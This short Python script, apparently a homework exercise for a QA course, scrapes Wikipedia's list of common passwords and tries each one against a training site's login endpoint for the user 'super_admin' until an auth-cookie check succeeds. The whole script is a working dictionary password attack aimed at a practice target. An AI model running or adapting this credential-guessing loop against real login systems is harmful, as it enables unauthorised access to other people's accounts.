import requests
from lxml import html

response = requests.get("https://en.wikipedia.org/wiki/List_of_the_most_common_passwords")

tree = html.fromstring(response.text)

locator = '//*[contains(text(),"Top 25 most common passwords by year according to SplashData")]//..//td[@align="left"]/text()'
passwords = tree.xpath(locator)
topPass = []
for password in passwords:
    password = str(password).strip()
    topPass.append(password)

for checkPass in topPass:

    response = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data={"login":"super_admin", "password":f"{checkPass}"})
    cookies = response.cookies.get("auth_cookie")
    response2 = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies={"auth_cookie":f"{cookies}"})
    if response2.text == "You are authorized":
        print(f"Пароль: {checkPass}")
        break